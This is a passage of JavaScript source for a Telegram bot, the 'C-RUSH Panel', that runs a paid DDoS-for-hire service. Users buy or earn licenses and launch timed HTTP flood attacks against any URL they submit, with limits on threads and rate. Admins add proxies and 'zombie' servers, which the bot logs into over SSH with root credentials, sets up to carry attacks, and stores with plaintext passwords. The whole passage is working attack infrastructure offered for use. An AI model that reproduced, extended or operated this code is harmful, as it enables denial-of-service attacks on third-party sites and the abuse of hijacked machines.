            ? `\n🔒 Active: #${[...activeAttacks.values()][0].id} (\`${[...activeAttacks.values()][0].target}\`)\n   finishes in ~${Math.max(0, Math.ceil(([...activeAttacks.values()][0].endTime - now()) / 1000))}s`
            : '';

        return reply(
            `⏳ *Queued — Position #${q.position}*\n\n` +
            `🎯 \`${target}\`\n` +
            `⏱ ${duration}s | 🧵 ${threads}t | ⚡ ${rate}\n` +
            activeInfo +
            `\n\n📋 *Queue info:*\n` +
            `• Attacks ahead: ${posAhead}\n` +
            `• Gap between attacks: ${CONFIG.QUEUE_GAP_MS/1000}s\n` +
            `• Approx start in: ~${etaSec}s\n\n` +
            `_/cancelqueue to cancel_`
        );
    }

    // 🆕 هیچ اتکی فعال نیست و صف خالی — فوراً شروع کن
    if (zombiesToUse > 0) {
        return spawnOnZombies(entry, activeZombies().slice(0, zombiesToUse));
    }
    return spawnAttackNow(entry, false);
}

// =============================================================
//  KEYBOARDS
// =============================================================
function mainMenuKeyboard(userId) {
    const rows = [
        [{ text: '🚀 New Attack',        callback_data: 'menu_attack' }],
        [{ text: '📊 My Active Attacks', callback_data: 'menu_active' }],
        [{ text: '📋 Queue Status',      callback_data: 'menu_queue' }],
        [{ text: '🔑 License Info',      callback_data: 'menu_license' }],
        [{ text: '🎁 Invite Friends',    callback_data: 'ref_menu' }],
    ];
    if (isAdmin(userId)) rows.push([{ text: '🛡 Admin Panel', callback_data: 'menu_admin' }]);
    return { inline_keyboard: rows };
}

function adminMenuKeyboard() {
    const onlineZ = activeZombies().length;
    return {
        inline_keyboard: [
            [{ text: '📊 Stats',            callback_data: 'adm_stats' },
             { text: '👥 Users',            callback_data: 'adm_users' }],
            [{ text: '🔑 Create License',   callback_data: 'adm_gen_license' },
             { text: '✏️ Edit License',     callback_data: 'adm_edit_license' }],
            [{ text: '📋 Licenses',         callback_data: 'adm_licenses' }],
            [{ text: `🧟 Zombies (${onlineZ}/${zombies.length})`, callback_data: 'z_menu' }],
            [{ text: '⛔ Blacklist',        callback_data: 'bl_menu' }],
            [{ text: '🚫 Ban User',         callback_data: 'adm_ban' },
             { text: '✅ Unban User',       callback_data: 'adm_unban' }],
            [{ text: '♻️ Reset Cooldown',   callback_data: 'adm_reset_cd' }],
            [{ text: '👤 Add Admin',        callback_data: 'adm_add_admin' },
             { text: '🗑 Remove Admin',     callback_data: 'adm_rm_admin' }],
            [{ text: '📢 Force Join',       callback_data: 'fj_menu' }],
            [{ text: '➕ Add Proxies',      callback_data: 'adm_proxies_add' },
             { text: '♻️ Replace Proxies',  callback_data: 'adm_proxies_replace' }],
            [{ text: '📈 Proxy Count',      callback_data: 'adm_proxies_count' },
             { text: '🌐 Scrape Proxies',   callback_data: 'adm_proxies_scrape' }],
            [{ text: '🏊 Pool Status',      callback_data: 'adm_pool' }],
            [{ text: '📋 Full Queue',       callback_data: 'adm_queue' }],
            [{ text: '🛑 Stop All Attacks', callback_data: 'adm_stop_all' }],
            [{ text: '🗑 Clear Queue',      callback_data: 'adm_clear_queue' }],
            [{ text: '📢 Broadcast',        callback_data: 'adm_broadcast' }],
        ]
    };
}

function attackOptionsKeyboard(data) {
    const o = data.options || {};
    const m = v => (v ? '✅ ' : '❌ ');
    return {
        inline_keyboard: [
            [{ text: m(o.cookies)  + 'Cookies',  callback_data: 'opt_cookies'  },
             { text: m(o.headfull) + 'Headfull', callback_data: 'opt_headfull' }],
            [{ text: m(o.cache)    + 'Cache',    callback_data: 'opt_cache'    },
             { text: m(o.silent)   + 'Silent',   callback_data: 'opt_silent'   }],
            [{ text: '🌐 HTTP v' + (o.version || '2'), callback_data: 'opt_version' }],
            [{ text: '✅ Confirm & Start', callback_data: 'opt_confirm' },
             { text: '❌ Cancel',          callback_data: 'opt_cancel'  }],
        ]
    };
}

function editLicenseKeyboard(key) {
    return {
        inline_keyboard: [
            [{ text: '📅 Edit Duration Days',    callback_data: `edit_days_${key}` }],
            [{ text: '👥 Edit Activations',      callback_data: `edit_uses_${key}` }],
            [{ text: '📊 Edit Daily Limit',      callback_data: `edit_daily_${key}` }],
            [{ text: '⏳ Edit Cooldown',         callback_data: `edit_cooldown_${key}` }],
            [{ text: '🧵 Edit Max Concurrent',   callback_data: `edit_concurrent_${key}` }],
            [{ text: '⏱ Edit Max Attack Dur.',  callback_data: `edit_atkdur_${key}` }],
            [{ text: '⚡ Edit Max Threads',      callback_data: `edit_threads_${key}` }],
            [{ text: '🚀 Edit Max Rate',         callback_data: `edit_rate_${key}` }],
            [{ text: '🧟 Edit Max Zombies',      callback_data: `edit_zombies_${key}` }],
            [{ text: '🗑 Delete License',        callback_data: `edit_delete_${key}` }],
        ]
    };
}

function tierKeyboard(step) {
    if (step === 'atkdur') return { inline_keyboard: [
        [{ text: '60s',   callback_data: 'tier_atk_60' },
         { text: '120s',  callback_data: 'tier_atk_120' },
         { text: '600s',  callback_data: 'tier_atk_600' }],
        [{ text: '3600s', callback_data: 'tier_atk_3600' },
         { text: '86400s',callback_data: 'tier_atk_86400' }],
    ]};
    if (step === 'threads') return { inline_keyboard: [
        [{ text: '10',  callback_data: 'tier_thr_10' },
         { text: '20',  callback_data: 'tier_thr_20' },
         { text: '50',  callback_data: 'tier_thr_50' },
         { text: '100', callback_data: 'tier_thr_100' }],
    ]};
    if (step === 'rate') return { inline_keyboard: [
        [{ text: '32',  callback_data: 'tier_rate_32' },
         { text: '64',  callback_data: 'tier_rate_64' },
         { text: '100', callback_data: 'tier_rate_100' },
         { text: '200', callback_data: 'tier_rate_200' }],
    ]};
    if (step === 'zombies') return { inline_keyboard: [
        [{ text: '0 (local only)', callback_data: 'tier_z_0' },
         { text: '1 zombie',       callback_data: 'tier_z_1' }],
        [{ text: '2 zombies',      callback_data: 'tier_z_2' },
         { text: '3 zombies',      callback_data: 'tier_z_3' }],
        [{ text: '5 zombies',      callback_data: 'tier_z_5' },
         { text: 'All available',  callback_data: 'tier_z_all' }],
    ]};
    return null;
}

// =============================================================
//  BOT INIT
// =============================================================
const bot = new Bot(CONFIG.BOT_TOKEN, { polling: true });

bot.setMyCommands([
    { command: 'start',       description: 'Start / Main menu' },
    { command: 'attack',      description: 'Quick attack: /attack <target> [dur] [threads] [rate] [flags]' },
    { command: 'active',      description: 'My active attacks' },
    { command: 'queue',       description: 'View current attack queue' },
    { command: 'quota',       description: 'Check cooldown + daily quota + caps' },
    { command: 'invite',      description: 'Get your invite link' },
    { command: 'cancel',      description: 'Cancel current operation' },
    { command: 'cancelqueue', description: 'Cancel my queued attacks' },
    { command: 'admin',       description: 'Admin panel' },
]).catch(() => {});

getBotUsername().catch(() => {});

// =============================================================
//  /start
// =============================================================
bot.onText(/^\/start(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const payload = (match[1] || '').trim();

    const u = getUser(userId);
    u.username  = msg.from.username || u.username;
    u.firstName = msg.from.first_name || u.firstName;
    saveJSON(FILES.users, users);

    if (u.banned) return bot.sendMessage(chatId, '⛔️ You are banned.');

    const isNewRef = !referrals[String(userId)];
    const ref = getReferral(userId);

    const refMatch = payload.match(/^ref_(\d+)$/);
    if (refMatch && isNewRef) {
        const inviterId = Number(refMatch[1]);
        if (inviterId !== userId) {
            ref.invitedBy = inviterId;
            saveJSON(FILES.referrals, referrals);
            const inviterRef = getReferral(inviterId);
            inviterRef.count = (inviterRef.count || 0) + 1;
            saveJSON(FILES.referrals, referrals);

            bot.sendMessage(inviterId,
                `🎉 *New invite!*\nProgress: *${inviterRef.count}/${CONFIG.REFERRAL_TARGET}*`,
                { parse_mode: 'Markdown' }).catch(() => {});

            if (inviterRef.count >= CONFIG.REFERRAL_TARGET && !inviterRef.rewardedAt) {
                const key = grantReferralReward(inviterId);
                if (key) bot.sendMessage(inviterId,
                    `🎁 *Referral Reward!*\n\n🔑 \`${key}\`\n\n` +
                    `📅 ${REFERRAL_REWARD.durationDays}d | 📊 ${REFERRAL_REWARD.dailyLimit}/day | ⏳ ${REFERRAL_REWARD.cooldownSeconds}s\n` +
                    `⚡ ${REFERRAL_REWARD.maxThreads}t | 🚀 ${REFERRAL_REWARD.maxRate}r | 🧵 ${REFERRAL_REWARD.maxConcurrent}\n\n` +
                    `✅ Active on your account.`,
                    { parse_mode: 'Markdown' }).catch(() => {});
            }
        }
    }

    const join = await checkMembership(userId);
    if (!join.ok) return sendJoinPrompt(chatId, join.missing);

    return showMainPanel(chatId, userId, msg.from.first_name);
});

async function showMainPanel(chatId, userId, firstName) {
    const u = getUser(userId);
    if (u.banned) return bot.sendMessage(chatId, '⛔️ You are banned.');

    if (!isLicensed(userId)) {
        userState.set(chatId, { step: 'await_license', data: {} });
        return bot.sendMessage(chatId,
            `⚡ *C-RUSH Panel*\n\nWelcome ${esc(firstName || 'friend')} 👋\n\n` +
            `🔑 Send your license key.\n📝 \`RUSH-XXXX-XXXX-XXXX-XXXX\`\n\n` +
            `💡 No key? Invite friends via *🎁 Invite Friends*.`,
            { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🎁 Invite Friends', callback_data: 'ref_menu' }]] } });
    }

    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const daysLeft = Math.max(0, Math.ceil((u.expiresAt - now()) / DAY));
    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
    const z = licMaxZombies(lic);
    const zStr = z === -1 ? 'all available' : (z === 0 ? 'local only' : `${z} zombie(s)`);
    const activeInfo = activeAttacks.size > 0
        ? `🔴 Active: #${[...activeAttacks.values()][0].id}`
        : '🟢 Idle';
    const queueLock = Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000));

    return bot.sendMessage(chatId,
        `⚡ *C-RUSH Panel*\n\n` +
        `👤 ID: \`${userId}\`\n📅 Valid: ${daysLeft}d\n` +
        `📊 Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
        `⏳ CD: ${cdRemain > 0 ? cdRemain + 's' : 'ready'}\n` +
        `⏱ Caps: ${licMaxAttackDuration(lic)}s | ${licMaxThreads(lic)}t | ${licMaxRate(lic)}r\n` +
        `🧟 Attack mode: ${zStr}\n\n` +
        `🏊 *Pool:*\n` +
        `• ${activeInfo}\n` +
        `• Queue: ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n` +
        `• Gap: ${CONFIG.QUEUE_GAP_MS/1000}s` +
        (queueLock > 0 ? `\n• 🔒 Next in: ${queueLock}s` : '') +
        `\n\nChoose:`,
        { parse_mode: 'Markdown', reply_markup: mainMenuKeyboard(userId) }
    );
}

// =============================================================
//  /invite
// =============================================================
bot.onText(/^\/invite/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const uname = await getBotUsername();
    if (!uname) return bot.sendMessage(chatId, '⚠️ Try again in a moment.');
    const ref = getReferral(userId);
    const link = `https://t.me/${uname}?start=ref_${userId}`;
    const count = ref.count || 0;
    const filled = Math.min(count, CONFIG.REFERRAL_TARGET);
    const bar = '█'.repeat(filled) + '░'.repeat(Math.max(0, CONFIG.REFERRAL_TARGET - filled));

    bot.sendMessage(chatId,
        `🎁 *Invite & Earn*\n\n\`${link}\`\n\nProgress: ${bar} *${count}/${CONFIG.REFERRAL_TARGET}*\n\n` +
        `🎁 ${CONFIG.REFERRAL_TARGET} invites = FREE license\n` +
        `📅 ${REFERRAL_REWARD.durationDays}d | 📊 ${REFERRAL_REWARD.dailyLimit}/day | ⏳ ${REFERRAL_REWARD.cooldownSeconds}s\n` +
        `⚡ ${REFERRAL_REWARD.maxThreads}t | 🚀 ${REFERRAL_REWARD.maxRate}r`,
        { parse_mode: 'Markdown' });
});

// =============================================================
//  /queue
// =============================================================
bot.onText(/^\/queue/, (msg) => {
    const chatId = msg.chat.id, userId = msg.from.id;
    const queueLock = Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000));
    let txt = '📋 *Attack Queue*\n\n';

    if (activeAttacks.size > 0) {
        const a = [...activeAttacks.values()][0];
        const rem = Math.max(0, Math.ceil((a.endTime - now()) / 1000));
        txt += `🔴 *Active:* #${a.id} → \`${a.target}\` (${rem}s left)\n\n`;
    } else {
        txt += `🟢 *Active:* none\n\n`;
    }

    if (queueLock > 0) {
        txt += `🔒 *Queue cooldown:* ${queueLock}s\n\n`;
    }

    if (!attackQueue.length) {
        txt += `📭 Queue empty`;
    } else {
        txt += `⏳ *Queued:* ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n\n`;
        attackQueue.slice(0, 15).forEach((q, i) => {
            const mine = q.userId === userId ? ' ⬅️' : '';
            txt += `${i + 1}. \`${q.target}\` — ${q.duration}s${mine}\n`;
        });
        if (attackQueue.length > 15) txt += `... +${attackQueue.length - 15} more\n`;
        txt += `\nGap between attacks: ${CONFIG.QUEUE_GAP_MS/1000}s`;
    }

    bot.sendMessage(chatId, txt, { parse_mode: 'Markdown' });
});

// =============================================================
//  /quota /active /cancel /cancelqueue /admin /attack
// =============================================================
bot.onText(/^\/quota/, (msg) => {
    const chatId = msg.chat.id, userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const u = getUser(userId), lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);
    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;
    const z = licMaxZombies(lic);
    const queueLock = Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000));
    bot.sendMessage(chatId,
        `📊 *Your Quota*\n\n` +
        `• Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5} (${dailyLeft} left)\n` +
        `• Cooldown: ${cdRemain > 0 ? cdRemain+'s' : '✅ ready'}\n` +
        `• Concurrent: ${lic?.maxConcurrent ?? 1}\n` +
        `• 🧟 Zombies: ${z === -1 ? 'all available' : (z === 0 ? 'local only' : z)}\n\n` +
        `🎯 *Caps*\n• ${licMaxAttackDuration(lic)}s | ${licMaxThreads(lic)}t | ${licMaxRate(lic)}r/t\n\n` +
        `🏊 *Pool*\n• Active: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS} | ⏳ Queue: ${attackQueue.length}` +
        (queueLock > 0 ? `\n• 🔒 Next in: ${queueLock}s` : ''),
        { parse_mode: 'Markdown' });
});

bot.onText(/^\/admin/, (msg) => {
    if (!isAdmin(msg.from.id)) return;
    bot.sendMessage(msg.chat.id, '🛡 *Admin Panel*', { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() });
});

bot.onText(/^\/active/, (msg) => {
    const chatId = msg.chat.id, userId = msg.from.id;
    const list = [...activeAttacks.values()].filter(a => a.userId === userId);
    if (!list.length) return bot.sendMessage(chatId, '📭 No active attacks.');
    const kb = { inline_keyboard: [] };
    let txt = '📊 *Your Active Attacks*\n\n';
    for (const a of list) {
        const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
        const typeIcon = a.type === 'zombie' ? `🧟×${a.children.length}` : '💻';
        txt += `#${a.id} ${typeIcon} → \`${a.target}\` — ${rem}s\n`;
        kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
    }
    bot.sendMessage(chatId, txt, { parse_mode: 'Markdown', reply_markup: kb });
});

bot.onText(/^\/cancel/, (msg) => {
    userState.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, '❌ Cancelled.');
});

bot.onText(/^\/cancelqueue/, (msg) => {
    const chatId = msg.chat.id, userId = msg.from.id;
    const before = attackQueue.length;
    removeFromQueueByUser(userId);
    const removed = before - attackQueue.length;
    bot.sendMessage(chatId, removed > 0 ? `🛑 Cancelled ${removed} queued.` : '📭 Nothing queued.');
});

bot.onText(/^\/attack(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id, userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const lic = getLicenseForUser(userId);
    const raw = (match[1] || '').trim();

    (async () => {
        const join = await checkMembership(userId);
        if (!join.ok) return sendJoinPrompt(chatId, join.missing);

        if (!raw) {
            userState.set(chatId, { step: 'attack_target', data: {} });
            return bot.sendMessage(chatId, '🎯 Send target URL:');
        }
        const parts = raw.split(/\s+/);
        let target = parts[0];
        if (!/^https?:\/\//i.test(target)) target = 'https://' + target;

        const maxDur = licMaxAttackDuration(lic), maxThr = licMaxThreads(lic), maxRt = licMaxRate(lic);
        const dur  = Math.min(parseInt(parts[1]) || Math.min(60, maxDur), maxDur);
        const thr  = Math.min(parseInt(parts[2]) || Math.min(20, maxThr), maxThr);
        const rate = Math.min(parseInt(parts[3]) || Math.min(64, maxRt),  maxRt);
        const flags = parts.slice(4);
        const options = {
            cookies:  flags.includes('-c'),
            headfull: flags.length === 0 || flags.includes('-h'),
            cache:    !flags.includes('-chfalse'),
            silent:   flags.length === 0 || flags.includes('-s'),
            version:  flags.includes('-v1') ? '1' : '2',
        };
        dispatchAttack(chatId, userId, target, dur, thr, rate, options,
            t => bot.sendMessage(chatId, t, { parse_mode: 'Markdown' }));
    })();
});

// =============================================================
//  DOCUMENT (proxy upload)
// =============================================================
bot.on('document', async (msg) => {
    const chatId = msg.chat.id, userId = msg.from.id;
    const st = userState.get(chatId);
    if (!st || st.step !== 'adm_proxies') {
        return bot.sendMessage(chatId, '📎 Open *Admin Panel → Add/Replace Proxies* first, then send .txt.',
            { parse_mode: 'Markdown' });
    }
    if (!isAdmin(userId)) return bot.sendMessage(chatId, '⛔ Access denied.');
    const doc = msg.document;
    const name = (doc.file_name || '').toLowerCase();
    if (!name.endsWith('.txt')) return bot.sendMessage(chatId, '❌ .txt only.');
    if (doc.file_size && doc.file_size > 5 * 1024 * 1024) return bot.sendMessage(chatId, '❌ Max 5 MB.');

    let downloadedPath = null;
    try {
        downloadedPath = await bot.downloadFile(doc.file_id, CONFIG.TMP_DIR);
        if (!downloadedPath || !fs.existsSync(downloadedPath)) throw new Error('download failed');
        const raw = fs.readFileSync(downloadedPath, 'utf8');
        const lines = parseProxyLines(raw);
        try { fs.unlinkSync(downloadedPath); } catch {}
        downloadedPath = null;
        if (!lines.length) {
            userState.delete(chatId);
            return bot.sendMessage(chatId, '❌ No valid proxies.');
        }
        const mode = st.data.mode || 'add';
        const result = mergeProxies(lines, mode);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ *Proxies updated*\n📥 ${result.submitted} | ➕ ${result.added} | 🎯 total *${result.total}*`,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() });
    } catch (err) {
        try { if (downloadedPath && fs.existsSync(downloadedPath)) fs.unlinkSync(downloadedPath); } catch {}
        userState.delete(chatId);
        return bot.sendMessage(chatId, `❌ ${esc(err.message)}`);
    }
});

// =============================================================
//  MESSAGE HANDLER
// =============================================================
bot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const chatId = msg.chat.id, userId = msg.from.id;
    const st = userState.get(chatId);
    if (!st) return;

    // ---- license activation ----
    if (st.step === 'await_license') {
        const code = msg.text.trim().toUpperCase();
        const lic = licenses[code];
        if (!lic) return bot.sendMessage(chatId, '❌ Invalid license.');
        if (lic.expiresAt && lic.expiresAt < now()) return bot.sendMessage(chatId, '❌ Expired.');
        if ((lic.usedCount || 0) >= lic.maxUses) return bot.sendMessage(chatId, '❌ Fully used.');
        const join = await checkMembership(userId);
        if (!join.ok) return sendJoinPrompt(chatId, join.missing);

        lic.usedCount = (lic.usedCount || 0) + 1;
        lic.usedBy = lic.usedBy || [];
        lic.usedBy.push({ userId, at: now() });
        saveJSON(FILES.licenses, licenses);

        const u = getUser(userId);
        const startFrom = Math.max(now(), u.expiresAt || 0);
        u.licenseKey = code; u.activatedAt = now();
        u.expiresAt = startFrom + lic.durationDays * DAY;
        u.daily = { date: todayStr(), count: 0 }; u.lastAttackAt = 0;
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        await bot.sendMessage(chatId,
            `✅ *Activated!*\n\n📅 ${lic.durationDays}d\n📊 ${lic.dailyLimit ?? 5}/day\n` +
            `⏳ ${lic.cooldownSeconds ?? 60}s | 🧵 ${lic.maxConcurrent ?? 1}\n` +
            `⏱ ${licMaxAttackDuration(lic)}s | ⚡ ${licMaxThreads(lic)}t | 🚀 ${licMaxRate(lic)}r`,
            { parse_mode: 'Markdown' });
        return bot.sendMessage(chatId, 'Menu:', { reply_markup: mainMenuKeyboard(userId) });
    }

    // ---- attack wizard ----
    if (st.step === 'attack_target') {
        let t = msg.text.trim();
        if (!/^https?:\/\//i.test(t)) t = 'https://' + t;
        try {
            const u = new URL(t);
            if (!u.hostname) throw new Error();
            const blocked = isBlacklisted(t);
            if (blocked) {
                userState.delete(chatId);
                return bot.sendMessage(chatId, `⛔ *Target blocked* — matches \`${esc(blocked)}\``, { parse_mode: 'Markdown' });
            }
            st.data.target = t; st.step = 'attack_duration';
            const lic = getLicenseForUser(userId);
            return bot.sendMessage(chatId, `⏱ Duration (1 - ${licMaxAttackDuration(lic)}s):`);
        } catch { return bot.sendMessage(chatId, '❌ Invalid URL.'); }
    }

    if (st.step === 'attack_duration') {
        const lic = getLicenseForUser(userId);
        const maxDur = licMaxAttackDuration(lic);
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > maxDur) return bot.sendMessage(chatId, `❌ 1-${maxDur}.`);
        st.data.duration = d; st.step = 'attack_threads';
        const maxThr = licMaxThreads(lic);
        return bot.sendMessage(chatId, `🧵 Threads (1-${maxThr}):`,
            { reply_markup: { inline_keyboard: [[{ text: `Default (${Math.min(20, maxThr)})`, callback_data: 'def_threads' }]] } });
    }

    if (st.step === 'attack_threads') {
        const lic = getLicenseForUser(userId);
        const maxThr = licMaxThreads(lic);
        const t = parseInt(msg.text.trim());
        if (!t || t < 1 || t > maxThr) return bot.sendMessage(chatId, `❌ 1-${maxThr}.`);
        st.data.threads = t; st.step = 'attack_rate';
        const maxRt = licMaxRate(lic);
        return bot.sendMessage(chatId, `⚡ Rate (1-${maxRt}):`,
            { reply_markup: { inline_keyboard: [[{ text: `Default (${Math.min(64, maxRt)})`, callback_data: 'def_rate' }]] } });
    }

    if (st.step === 'attack_rate') {
        const lic = getLicenseForUser(userId);
        const maxRt = licMaxRate(lic);
        const r = parseInt(msg.text.trim());
        if (!r || r < 1 || r > maxRt) return bot.sendMessage(chatId, `❌ 1-${maxRt}.`);
        st.data.rate = r;
        st.data.options = { cookies: false, headfull: true, cache: true, silent: true, version: '2' };
        st.step = 'attack_options';
        return bot.sendMessage(chatId, '🔧 Options:', { reply_markup: attackOptionsKeyboard(st.data) });
    }

    // ---- ZOMBIE add wizard ----
    if (st.step === 'z_host') {
        if (!isAdmin(userId)) return;
        const raw = msg.text.trim();
        const m = raw.match(/^([A-Za-z0-9_.\-]+):(\d{1,5})$/);
        if (!m) return bot.sendMessage(chatId, '❌ Format: `host:port` (e.g. `1.2.3.4:22`)', { parse_mode: 'Markdown' });
        st.data.host = m[1]; st.data.port = parseInt(m[2]);
        if (st.data.port < 1 || st.data.port > 65535) return bot.sendMessage(chatId, '❌ Invalid port.');
        st.step = 'z_user';
        return bot.sendMessage(chatId, `👤 Username for \`${st.data.host}:${st.data.port}\` (e.g. root):`, { parse_mode: 'Markdown' });
    }

    if (st.step === 'z_user') {
        if (!isAdmin(userId)) return;
        st.data.username = msg.text.trim();
        if (!st.data.username) return bot.sendMessage(chatId, '❌ Empty username.');
        st.step = 'z_pass';
        return bot.sendMessage(chatId, `🔐 Password for \`${st.data.username}@${st.data.host}\`:\n\n⚠️ Message will be deleted for security.`, { parse_mode: 'Markdown' });
    }

    if (st.step === 'z_pass') {
        if (!isAdmin(userId)) return;
        const password = msg.text;
        try { await bot.deleteMessage(chatId, msg.message_id); } catch {}
        userState.delete(chatId);

        const { host, port, username } = st.data;
        const progressMsg = await bot.sendMessage(chatId, `🔄 Connecting to \`${host}:${port}\`...`, { parse_mode: 'Markdown' });
        const upd = async (text) => {
            await bot.editMessageText(text, { chat_id: chatId, message_id: progressMsg.message_id }).catch(() => {});
        };

        let conn;
        try {
            conn = await sshConnect({ host, port, username, password }, 20000);
            await upd(`✅ Connected.\n📦 Setting up environment...`);

            const nodeVersion = await setupZombieDeps(conn, async (t) => { await upd(t); });
            conn.end();

            const zid = 'z_' + crypto.randomBytes(6).toString('hex');
            zombies.push({
                id: zid, host, port, username, password,
                status: 'online', nodeVersion,
                addedAt: now(), lastCheck: now(), addedBy: userId,
            });
            saveJSON(FILES.zombies, zombies);

            await bot.editMessageText(
                `✅ *Zombie ready!*\n\n` +
                `🆔 \`${zid}\`\n🌐 \`${host}:${port}\`\n👤 \`${username}\`\n` +
                `📦 Node.js ${nodeVersion}\n` +
                `🧟 Online: ${activeZombies().length}/${zombies.length}`,
                { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
            ).catch(() => {});
        } catch (e) {
            try { conn?.end(); } catch {}
            await bot.editMessageText(
                `❌ *Zombie setup failed*\n\n\`${esc(e.message.slice(0, 300))}\`\n\n` +
                `Check credentials, SSH access, and root/sudo.`,
                { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
            ).catch(() => {});
        }
        return;
    }

    // ---- FORCE JOIN add channel ----
    if (st.step === 'adm_fj_add') {
        if (!isAdmin(userId)) return;
        const raw = msg.text.trim();
        if (!raw.startsWith('@') && !raw.startsWith('-100')) return bot.sendMessage(chatId, '❌ @username or -100xxx.');
        try {
            const chat = await bot.getChat(raw);
            const channels = loadJSON(FILES.channels, []);
            if (channels.find(c => String(c.id) === String(chat.id))) {
                userState.delete(chatId);
                return bot.sendMessage(chatId, '⚠️ Already in list.', { reply_markup: adminMenuKeyboard() });
            }
            const me = await bot.getMe();
            try {
                const bm = await bot.getChatMember(chat.id, me.id);
                if (!['administrator', 'creator'].includes(bm.status)) {
                    userState.delete(chatId);
                    return bot.sendMessage(chatId, `❌ Bot must be administrator (currently ${bm.status}).`);
                }
            } catch {
                userState.delete(chatId);
                return bot.sendMessage(chatId, '❌ Bot cannot access. Add bot as admin first.');
            }
            let inviteLink = chat.username ? `https://t.me/${chat.username}` : null;
            if (!inviteLink) {
                try { const l = await bot.createChatInviteLink(chat.id); inviteLink = l.invite_link; } catch {}
            }
            channels.push({ id: chat.id, title: chat.title || String(chat.id), username: chat.username || null, inviteLink });
            saveJSON(FILES.channels, channels);
            memberCache.clear(); warnedChannels.clear();
            userState.delete(chatId);
            return bot.sendMessage(chatId, `✅ *Channel added*\n\n📢 ${esc(chat.title || chat.id)}\n🔗 ${inviteLink || '—'}`,
                { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() });
        } catch (e) {
            return bot.sendMessage(chatId, `❌ ${esc(e.message)}`);
        }
    }

    // ---- BLACKLIST add ----
    if (st.step === 'bl_add') {
        if (!isAdmin(userId)) return;
        const raw = msg.text.trim().toLowerCase();
        if (!raw || raw.length > 200) return bot.sendMessage(chatId, '❌ Invalid pattern.');
        if (blacklist.map(b => String(b).toLowerCase()).includes(raw)) {
            userState.delete(chatId);
            return bot.sendMessage(chatId, '⚠️ Already blacklisted.', { reply_markup: adminMenuKeyboard() });
        }
        blacklist.push(raw);
        saveJSON(FILES.blacklist, blacklist);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ Added to blacklist: \`${esc(raw)}\`\n\n📋 Total: ${blacklist.length}`,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() });
    }

    // ---- License creation wizard ----
    if (st.step === 'adm_lic_days') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 3650) return bot.sendMessage(chatId, '❌ 1-3650.');
        st.data.days = d; st.step = 'adm_lic_uses';
        return bot.sendMessage(chatId, '👥 Max activations:',
            { reply_markup: { inline_keyboard: [
                [{ text: '1', callback_data: 'lic_uses_1' }, { text: '5', callback_data: 'lic_uses_5' }],
                [{ text: '10', callback_data: 'lic_uses_10' }, { text: '∞', callback_data: 'lic_uses_inf' }],
            ] } });
    }

    if (st.step === 'adm_lic_daily') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 1000) return bot.sendMessage(chatId, '❌ 1-1000.');
        st.data.dailyLimit = d; st.step = 'adm_lic_cooldown';
        return bot.sendMessage(chatId, '⏳ Cooldown (seconds, 0-86400):');
    }

    if (st.step === 'adm_lic_cooldown') {
        if (!isAdmin(userId)) return;
        const s = parseInt(msg.text.trim());
        if (isNaN(s) || s < 0 || s > 86400) return bot.sendMessage(chatId, '❌ 0-86400.');
        st.data.cooldownSeconds = s; st.step = 'adm_lic_concurrent';
        return bot.sendMessage(chatId, '🧵 Concurrent (1-10):');
    }

    if (st.step === 'adm_lic_concurrent') {
        if (!isAdmin(userId)) return;
        const c = parseInt(msg.text.trim());
        if (!c || c < 1 || c > 10) return bot.sendMessage(chatId, '❌ 1-10.');
        st.data.maxConcurrent = c; st.step = 'adm_lic_atkdur';
        return bot.sendMessage(chatId, `⏱ Max attack duration (1-${CONFIG.MAX_ATTACK_DURATION}):`,
            { reply_markup: tierKeyboard('atkdur') });
    }

    if (st.step === 'adm_lic_atkdur') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > CONFIG.MAX_ATTACK_DURATION) return bot.sendMessage(chatId, `❌ 1-${CONFIG.MAX_ATTACK_DURATION}.`);
        st.data.maxAttackDuration = d; st.step = 'adm_lic_threads';
